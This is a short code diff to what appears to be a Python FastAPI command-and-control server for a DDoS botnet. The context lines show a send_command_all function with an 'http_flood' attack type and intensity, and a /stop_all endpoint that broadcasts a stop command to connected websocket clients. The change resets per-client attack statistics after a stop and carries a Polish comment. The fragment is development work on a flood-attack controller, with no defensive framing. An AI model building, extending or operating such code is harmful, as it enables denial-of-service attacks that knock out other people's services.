@@ -91,7 +91,7 @@ async def send_command_all(url: str, attack_type: str = "http_flood", intensity:
 
 @app.post("/stop_all")
 async def stop_all():
-    global attack_running, attack_started, stop_task
+    global attack_running, attack_started, stop_task, client_stats
     if not clients:
         return {"status": "error"}
     attack_running = False
@@ -100,4 +100,7 @@ async def stop_all():
         stop_task.cancel()
     payload = json.dumps({"action": "stop"})
     await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()])
+    # Reset wszystkich statystyk po STOP
+    for k in client_stats:
+        client_stats[k] = 0
     return {"status": "stopped", "clients_count": len(clients)}
